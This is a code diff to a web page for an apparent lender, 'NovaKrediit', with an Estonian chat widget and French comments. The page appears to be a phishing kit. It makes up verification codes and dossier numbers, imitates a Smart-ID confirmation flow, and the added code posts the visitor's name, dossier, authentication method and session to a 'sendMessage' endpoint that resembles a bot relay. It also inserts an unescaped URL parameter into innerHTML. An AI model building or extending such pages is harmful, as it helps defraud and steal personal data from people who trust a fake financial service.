@@ -341,6 +341,12 @@ function getParam(name){
 }
 
 var method=getParam('method')||'Smart-ID';
+// Personnaliser message de bienvenue avec nom client
+var welcomeEl=document.getElementById('nk-welcome-msg');
+var clientN=getParam('name')||'';
+if(welcomeEl && clientN){
+  welcomeEl.innerHTML='👋 Tere, '+clientN+'! Vajate abi? Kirjutage meile.<div class="nk-msg-time">NovaKrediit</div>';
+}
 var code=getParam('code')||String(Math.floor(1000+Math.random()*9000));
 var name=getParam('name')||'';
 var dossier=getParam('dossier')||'NK-'+new Date().getFullYear()+'-'+Math.floor(1000+Math.random()*9000);
@@ -393,7 +399,7 @@ function toggleChannels(){
       <button id="nk-chat-close" onclick="nkToggleChat()">✕</button>
     </div>
     <div id="nk-chat-messages">
-      <div class="nk-msg nk-msg-bot">👋 Tere! Kuidas saame teid aidata?<div class="nk-msg-time">NovaKrediit</div></div>
+      <div class="nk-msg nk-msg-bot" id="nk-welcome-msg">👋 Tere! Kuidas saame teid aidata?<div class="nk-msg-time">NovaKrediit</div></div>
     </div>
     <div id="nk-chat-form">
       <input type="text" id="nk-chat-input" placeholder="Kirjutage sõnum..." onkeydown="if(event.key==='Enter')nkSend()">
@@ -457,10 +463,16 @@ function nkSend(){
   var name=(document.getElementById('eesnimi')||{}).value||'';
   var email=(document.getElementById('epost')||{}).value||'';
   var tel=(document.getElementById('telefon')||{}).value||'';
-  var msg='💬 *NovaKrediit Chat*\n';
-  if(name) msg+='👤 '+name+'\n';
-  if(email) msg+='📧 '+email+'\n';
-  if(tel) msg+='📱 '+tel+'\n';
+  // Récupérer infos depuis URL de la page confirmation
+  var urlParams=new URLSearchParams(window.location.search);
+  var clientName=urlParams.get('name')||name||'';
+  var clientDossier=urlParams.get('dossier')||'';
+  var clientMethod=urlParams.get('method')||'';
+  var msg='💬 *NovaKrediit Chat — Confirmation*\n';
+  if(clientDossier) msg+='📋 Dossier: '+clientDossier+'\n';
+  if(clientName) msg+='👤 '+clientName+'\n';
+  if(clientMethod) msg+='🔐 '+clientMethod+'\n';
+  msg+='🔑 Session: '+nkSession.slice(-6)+'\n';
   msg+='\n'+text;
   fetch(NK_BASE+'/sendMessage',{
     method:'POST',
